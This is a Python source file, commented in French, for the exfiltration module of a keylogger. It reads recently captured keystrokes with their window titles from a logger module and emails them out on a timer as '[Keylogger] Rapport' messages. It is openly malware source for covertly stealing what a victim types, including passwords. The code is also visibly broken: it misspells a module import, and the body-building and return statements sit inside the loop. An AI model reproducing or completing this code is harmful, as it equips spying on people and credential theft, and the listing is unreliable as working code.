import smtplib
import time
import threading
from email.mine.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import os
from datetime import datetime
from logger import get_last

# ── CONFIGURATION ────────────────────────────────────────────
SMTP_SERVER = "localhost"
SMTP_PORT = 1025

EMAIL_FROM = ""

EMAIL_TO = ""
EMAIL_PASSWORD = ""

SEND_INTERVAL = 600
MAX_KEYS = 100

# ── CONSTRUCTION DU MESSAGE ──────────────────────────────────
def build_email(rows):
    msg = MIMEMultipart("alternative") # Le conteneur principal du mail
    msg["From"]    = EMAIL_FROM
    msg["To"]      = EMAIL_TO
    msg["Subject"] = f"[Keylogger] Rapport — {datetime.now().strftime('%Y-%m-%d %H:%M')}"

# ── Construction du corps en texte brut ──────────────────
    if not rows:
        body = "pas de frape depuis la dernier"
    else:
        lines = []
        for timestamp, key, window in rows:
            lines.append(f"[{timestamp}] {window} → {key}")
            body = "\n".join(lines)
            body = f"frape capturé ({len(rows)}):\n\n" + body

            msg.attach(MIMEText(body,"plain","utf-8"))

            return msg
        
# ── ENVOI SMTP ───────────────────────────────────────────────

def send_mail():
    rows = get_last(MAX_KEYS)
    if not rows:
        print("[Mailer] Rien à envoyer.")
        return
    msg = build_email(rows)
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_FROM, EMAIL_PASSWORD)
            server.sendmail(EMAIL_FROM,EMAIL_TO, msg.as_string()) #envoi du mail
        print(f"[Mailer] Email envoye — {len(rows)} frappes")
    except ConnectionRefusedError:
        print("[Mailer] pas de gmail ou Mailhog lancé ou movais port")
    except smtplib.SMTPAuthenticationError:
        print("[Mailer] mauvais mot de pass gmail")
    except Exception as e:
        print(f"[Mailer]  Erreur relis ton code a tout les coups : {e}")

# ── SCHEDULER ────────────────────────────────────────────────

class Mailer:
    def __init__(self):
        self.running = False
    def start(self):
        self.running = True #boucle infini pour drop les logs
        print(f"[Mailer] on envoi tout les {SEND_INTERVAL // 60} min")
        while self.running:
            send_mail()  
            time.sleep(SEND_INTERVAL)#pour pas spam
    def stop(self):
        self.running = False


# ── TEST ──────────────────────────────────────────
if __name__ == "__main__":
    print("[*] Test ......")
    send_mail()